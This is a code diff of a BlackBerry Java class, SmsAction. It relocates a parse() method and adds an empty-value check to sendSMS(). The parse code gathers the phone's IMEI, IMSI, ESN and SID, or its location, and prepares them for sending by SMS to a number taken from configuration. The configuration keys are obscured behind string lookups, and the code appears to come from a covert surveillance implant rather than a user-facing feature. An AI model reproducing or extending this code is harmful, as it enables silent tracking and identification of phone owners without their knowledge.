@@ -27,6 +27,7 @@ import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.location.LocationHelper;
 import blackberry.location.LocationObserver;
+import blackberry.utils.StringUtils;
 import blackberry.utils.Utils;
 
 /**
@@ -47,6 +48,79 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
     public SmsAction(final ConfAction params) {
         super(params);
+    }
+
+    /*
+     * (non-Javadoc)
+     * @see blackberry.action.SubAction#parse(byte[])
+     */
+    protected boolean parse(final ConfAction params) {
+        try {
+            number = Utils
+                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$
+            descrType = params.getString(Messages.getString("9.27")); //$NON-NLS-1$
+            if (Messages.getString("9.28").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_LOCATION;
+            } else if (Messages.getString("9.29").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_TEXT;
+            } else if (Messages.getString("9.30").equals(descrType)) { //$NON-NLS-1$
+                type = TYPE_SIM;
+            } else {
+                //#ifdef DEBUG
+                debug.error("parse Error, unknown type: " + descrType); //$NON-NLS-1$
+                //#endif
+                return false;
+            }
+    
+            //#ifdef DBC
+            Check.asserts(type >= 1 && type <= 3, "wrong type"); //$NON-NLS-1$
+            //#endif
+    
+            switch (type) {
+                case TYPE_TEXT:
+                    text = params.getString(Messages.getString("9.33")); //$NON-NLS-1$
+                    break;
+                case TYPE_LOCATION:
+                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
+                    break;
+                case TYPE_SIM:
+                    final StringBuffer sb = new StringBuffer();
+                    final Device device = Device.getInstance();
+                    if (Device.isCDMA()) {
+    
+                        sb.append(Messages.getString("9.34") + device.getSid() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+                        sb.append(Messages.getString("9.36") //$NON-NLS-1$
+                                + NumberUtilities.toString(device.getEsn(), 16)
+                                + "\n"); //$NON-NLS-1$
+                    }
+                    if (Device.isGPRS()) {
+                        sb.append(Messages.getString("9.38") + device.getImei(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+                        sb.append(Messages.getString("9.40") + device.getImsi(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
+                    }
+                    if (Device.isIDEN()) {
+                        //#ifdef DEBUG
+                        debug.error("SmsAction: IDEN not supported"); //$NON-NLS-1$
+                        //#endif
+                    }
+    
+                    text = sb.toString();
+                    break;
+                default:
+                    //#ifdef DEBUG
+                    debug.error("SmsAction.parse,  Unknown type: " + type); //$NON-NLS-1$
+                    //#endif
+                    break;
+            }
+    
+        } catch (final ConfigurationException e) {
+            //#ifdef DEBUG
+            debug.error(e);
+            debug.error(Messages.getString("9.44")); //$NON-NLS-1$
+            //#endif
+            return false;
+        }
+    
+        return true;
     }
 
     /*
@@ -214,6 +288,14 @@ public final class SmsAction extends SubAction implements LocationObserver {
     }
 
     boolean sendSMS(final String message) {
+        
+        if(StringUtils.empty(number) || StringUtils.empty(message)){
+            //#ifdef DEBUG
+            debug.trace("sendSMS: empty number or message");
+            //#endif
+            return false;
+        }
+        
         boolean ret = false;
         if (Device.isCDMA()) {
             //#ifdef DEBUG
@@ -244,79 +326,6 @@ public final class SmsAction extends SubAction implements LocationObserver {
 
         }
         return ret;
-    }
-
-    /*
-     * (non-Javadoc)
-     * @see blackberry.action.SubAction#parse(byte[])
-     */
-    protected boolean parse(final ConfAction params) {
-        try {
-            number = Utils
-                    .unspace(params.getString(Messages.getString("9.26"))); //$NON-NLS-1$
-            descrType = params.getString(Messages.getString("9.27")); //$NON-NLS-1$
-            if (Messages.getString("9.28").equals(descrType)) { //$NON-NLS-1$
-                type = TYPE_LOCATION;
-            } else if (Messages.getString("9.29").equals(descrType)) { //$NON-NLS-1$
-                type = TYPE_TEXT;
-            } else if (Messages.getString("9.30").equals(descrType)) { //$NON-NLS-1$
-                type = TYPE_SIM;
-            } else {
-                //#ifdef DEBUG
-                debug.error("parse Error, unknown type: " + descrType); //$NON-NLS-1$
-                //#endif
-                return false;
-            }
-
-            //#ifdef DBC
-            Check.asserts(type >= 1 && type <= 3, "wrong type"); //$NON-NLS-1$
-            //#endif
-
-            switch (type) {
-                case TYPE_TEXT:
-                    text = params.getString(Messages.getString("9.33")); //$NON-NLS-1$
-                    break;
-                case TYPE_LOCATION:
-                    // http://supportforums.blackberry.com/t5/Java-Development/How-To-Get-Cell-Tower-Info-Cell-ID-LAC-from-CDMA-BB-phones/m-p/34538
-                    break;
-                case TYPE_SIM:
-                    final StringBuffer sb = new StringBuffer();
-                    final Device device = Device.getInstance();
-                    if (Device.isCDMA()) {
-
-                        sb.append(Messages.getString("9.34") + device.getSid() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-                        sb.append(Messages.getString("9.36") //$NON-NLS-1$
-                                + NumberUtilities.toString(device.getEsn(), 16)
-                                + "\n"); //$NON-NLS-1$
-                    }
-                    if (Device.isGPRS()) {
-                        sb.append(Messages.getString("9.38") + device.getImei(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-                        sb.append(Messages.getString("9.40") + device.getImsi(true) + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
-                    }
-                    if (Device.isIDEN()) {
-                        //#ifdef DEBUG
-                        debug.error("SmsAction: IDEN not supported"); //$NON-NLS-1$
-                        //#endif
-                    }
-
-                    text = sb.toString();
-                    break;
-                default:
-                    //#ifdef DEBUG
-                    debug.error("SmsAction.parse,  Unknown type: " + type); //$NON-NLS-1$
-                    //#endif
-                    break;
-            }
-
-        } catch (final ConfigurationException e) {
-            //#ifdef DEBUG
-            debug.error(e);
-            debug.error(Messages.getString("9.44")); //$NON-NLS-1$
-            //#endif
-            return false;
-        }
-
-        return true;
     }
 
     //#ifdef DEBUG
